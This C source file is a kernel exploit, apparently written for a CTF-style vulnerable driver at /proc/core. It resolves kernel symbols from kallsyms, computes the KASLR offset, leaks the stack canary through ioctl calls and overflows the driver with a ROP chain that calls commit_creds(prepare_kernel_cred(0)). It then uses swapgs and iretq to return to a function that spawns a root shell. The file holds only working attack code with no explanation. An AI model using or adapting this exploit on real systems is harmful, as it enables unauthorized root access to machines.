#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define CORE_READ 0x6677889B
#define CORE_OFF 0x6677889C
#define CORE_COPY 0x6677889A

size_t vmlinux_base,commit_creds_addr,prepare_kernel_cred_addr;
size_t user_cs,user_ss,user_sp,user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;

void save_status()
{
	__asm__(
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags"
	);
}

void GetShell() {
    if (!getuid()) {
        system("/bin/sh");
    }
    else {
        puts("[-] CAN NOT GETSHELL.");
        exit(1);
    }
}

int find_symbols()
{
	char *ptr;
	char buf[0x40];
	FILE* fd = fopen("/tmp/kallsyms","r");
	if(!fd)
	{
		printf("[-] Open /tmp/kallsyms ERROR.\n");
		return 0;
	}
	while(fgets(buf,sizeof(buf),fd))
	{
		if(commit_creds_addr && prepare_kernel_cred_addr)
			return 1;
		if (strstr(buf, "commit_creds")) 
		{
            commit_creds_addr = strtoull(buf, &ptr, 16);
			printf("[+] Find: commit_creds: 0x%llx\n",commit_creds_addr);
        }
        if (strstr(buf, "prepare_kernel_cred")) 
		{
            prepare_kernel_cred_addr = strtoull(buf, &ptr, 16);
			printf("[+] Find: prepare_kernel_cred: 0x%llx\n",prepare_kernel_cred_addr);
        }
	}
	return 0;
}
int main()
{
    save_status();
	int f=find_symbols();
	if(!f)
	{
		printf("[-]Find Symbols ERROR.\n");
		exit(0);
	}
	
	vmlinux_base = commit_creds_addr - 0x9c8e0;
	size_t offset = vmlinux_base - raw_vmlinux_base;
	size_t pop_rdi = 0xffffffff81000b2f + offset;	//pop rdi; ret;
	size_t pop_rdx = 0xffffffff810a0f49 + offset;	//pop rdx; ret;
	size_t mov_rdi = 0xffffffff8106a6d2 + offset;	//mov rdi, rax; jmp rdx;
	size_t swapgs = 0xffffffff81a012da + offset;	//swapgs; popfq; ret;
	size_t iretq = 0xffffffff81050ac2 + offset;     //iretq; ret;
	size_t rop[0x100];
	char user_buf[0x40] = {0};
    int i;

	int fd = open("/proc/core", O_RDWR);
    if (!fd) {
        puts("[-] OPEN /proc/core ERROR.");
        exit(0);
    }
	ioctl(fd, CORE_OFF, 0x40);
    ioctl(fd, CORE_READ, user_buf);  //leak canary
	size_t canary = ((size_t *)user_buf)[0];
    printf("[+] Find canary: 0x%llx\n", canary);

    for(i = 0; i < 10; i++)
    {
        rop[i] = canary;
    }
	rop[i++] = pop_rdi;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred_addr;
	rop[i++] = pop_rdx;
	rop[i++] = commit_creds_addr;
	rop[i++] = mov_rdi;
	rop[i++] = swapgs;
	rop[i++] = 0;
	rop[i++] = iretq;
    rop[i++] = (size_t)GetShell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
	
	write(fd, rop, sizeof(rop));
	ioctl(fd, CORE_COPY, 0xffffffffffff0000|0x100);
	return 0;
}



